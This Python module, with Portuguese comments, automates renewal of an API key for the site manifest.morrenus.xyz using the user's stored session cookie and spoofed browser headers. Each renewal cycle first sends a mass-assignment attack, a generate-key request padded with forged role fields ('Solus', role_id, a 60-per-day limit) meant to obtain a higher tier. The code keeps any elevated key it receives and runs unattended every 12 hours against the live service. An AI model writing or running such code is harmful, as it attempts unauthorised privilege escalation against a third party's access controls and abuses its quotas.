"""
Hubcap API Automator (Projeto Fantasma)
Gerencia, renova e simula a API Key da morrenus.xyz para o LuaTools.
"""
from __future__ import annotations

import json
import threading
import time
from typing import Any, Dict, Optional

from logger import logger
from http_client import ensure_http_client
from settings.manager import _get_values_locked, _persist_values

HUBCAP_BASE_URL = "https://manifest.morrenus.xyz"
HUBCAP_CHECK_INTERVAL = 3600 * 12  # A cada 12 horas

_AUTOMATOR_THREAD: Optional[threading.Thread] = None

class HubcapAutomator:
    def __init__(self):
        self.lock = threading.Lock()
        self.client = ensure_http_client("Hubcap")

    def _get_cookie_header(self) -> str:
        with self.lock:
            values = _get_values_locked()
            general = values.get("general", {})
            return general.get("hubcapSessionCookie", "").strip()

    def _save_api_key(self, api_key: str) -> None:
        with self.lock:
            values = _get_values_locked()
            if "general" not in values:
                values["general"] = {}
            values["general"]["morrenusApiKey"] = api_key
            _persist_values(values)
            logger.log(f"HubcapAutomator: Nova API Key salva com sucesso. ({api_key[:10]}...)")

    def get_auth_data(self, cookie: str) -> Dict[str, Any]:
        """Tenta resgatar as informacoes de sessao e csrf_token"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 OPR/129.0.0.0",
            "Accept": "application/json",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Opera GX";v="129", "Chromium";v="145"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "DNT": "1",
            "Priority": "u=0, i",
            "Connection": "keep-alive",
            "Cookie": cookie
        }
        resp = self.client.get(f"{HUBCAP_BASE_URL}/auth/me", headers=headers, follow_redirects=True)
        resp.raise_for_status()
        return resp.json()

    def get_key_info(self, cookie: str) -> Dict[str, Any]:
        """Verifica os dados da key atual."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 OPR/129.0.0.0",
            "Accept": "application/json",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Opera GX";v="129", "Chromium";v="145"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "DNT": "1",
            "Connection": "keep-alive",
            "Cookie": cookie
        }
        resp = self.client.get(f"{HUBCAP_BASE_URL}/api-keys/my-key-info", headers=headers, follow_redirects=True)
        resp.raise_for_status()
        return resp.json()

    def generate_key(self, cookie: str, csrf_token: str, payload_override: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Injeta requisicao POST para gerar a chave, validando o CSRF cruzado."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 OPR/129.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Opera GX";v="129", "Chromium";v="145"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "DNT": "1",
            "Connection": "keep-alive",
            "Cookie": f"{cookie}; csrf_token={csrf_token}",
            "x-csrf-token": csrf_token,
            "origin": HUBCAP_BASE_URL,
            "referer": f"{HUBCAP_BASE_URL}/api-keys/stats"
        }
        payload = payload_override if payload_override is not None else {}
        resp = self.client.post(
            f"{HUBCAP_BASE_URL}/api-keys/generate-key", 
            headers=headers, 
            json=payload,
            follow_redirects=True
        )
        resp.raise_for_status()
        return resp.json()

    def run_check_cycle(self) -> None:
        try:
            cookie = self._get_cookie_header()
            if not cookie:
                return  # Nao tem cookie configurado
            
            # Formata caso o usuario tenha colocado so o JWT
            if "session=" not in cookie:
                cookie = f"session={cookie}"

            logger.log("HubcapAutomator: Verificando status da sessao e key...")
            auth_data = self.get_auth_data(cookie)
            if not auth_data.get("success"):
                logger.warn("HubcapAutomator: Falha ao validar sessao (cookie invalido ou vencido).")
                return

            csrf_token = auth_data.get("csrf_token")
            user_info = auth_data.get("user", {})
            logger.log(f"HubcapAutomator: Logado como {user_info.get('username', 'N/A')} | Plano Base: {user_info.get('highest_role')}")

            # Identificar validade da chave atual
            key_info = self.get_key_info(cookie)
            
            # Verificamos se há uma key salva localmente
            current_settings = _get_values_locked()
            saved_key = current_settings.get("general", {}).get("morrenusApiKey", "").strip()
            
            # Se expira em menos de 24 horas (86400 secs)
            expires_in = key_info.get("expires_in_seconds", 0)
            
            # Geraremos uma nova key se:
            # 1. O servidor diz que nao temos key
            # 2. O servidor diz que vai expirar
            # 3. Nao temos NENHUMA key local salva na UI e precisaremos forcar geracao para capturar
            if not key_info.get("has_key") or expires_in < 86400 or not saved_key:
                logger.log(f"HubcapAutomator: Key atual expirando ({expires_in}s). Tentando forjar regeneracao privilegiada...")
                
                # TENTATIVA OMEGA: Mass Assignment Vulnerability Simulation
                # Tenta pedir cargo de Solus (60/day) no Payload
                try:
                    payload_solus = {
                        "role": "Solus",
                        "role_id": "1327860222068527145", # Ficticio pra teste mass assign
                        "limit": 60,
                        "highest_role": "Solus"
                    }
                    res = self.generate_key(cookie, csrf_token, payload_override=payload_solus)
                    if res.get("success") and res.get("api_key"):
                        logger.log("HubcapAutomator: SUCESSO! Payload fantasma de Role aceito pelo servidor!")
                        self._save_api_key(res["api_key"])
                        return
                except Exception as shadow_e:
                    logger.log(f"HubcapAutomator: Forja avancada negada ({shadow_e}). Caindo para geracao default segura.")
                
                # Geracao Padrao Seguro (Sem Overrides)
                try:
                    res_safe = self.generate_key(cookie, csrf_token)
                    if res_safe.get("success") and res_safe.get("api_key"):
                        logger.log("HubcapAutomator: Geracao padrao executada com sucesso.")
                        self._save_api_key(res_safe["api_key"])
                except Exception as e:
                    logger.warn(f"HubcapAutomator: Falha critica na geracao da API: {e}")
            else:
                pass # Nada a fazer, log silencioso
                
        except Exception as e:
            logger.warn(f"HubcapAutomator: Ciclo falhou: {e}")

def _loop_worker():
    auto = HubcapAutomator()
    # Roda uma vez no startup com timeout curto
    time.sleep(5)
    auto.run_check_cycle()
    
    # Roda o relogio a cada 12 horas
    while True:
        time.sleep(HUBCAP_CHECK_INTERVAL)
        auto.run_check_cycle()

def start_hubcap_automator():
    global _AUTOMATOR_THREAD
    if _AUTOMATOR_THREAD is None or not _AUTOMATOR_THREAD.is_alive():
        _AUTOMATOR_THREAD = threading.Thread(target=_loop_worker, daemon=True)
        _AUTOMATOR_THREAD.start()
        logger.log("HubcapAutomator: Servico em background iniciado.")

__all__ = ["start_hubcap_automator"]
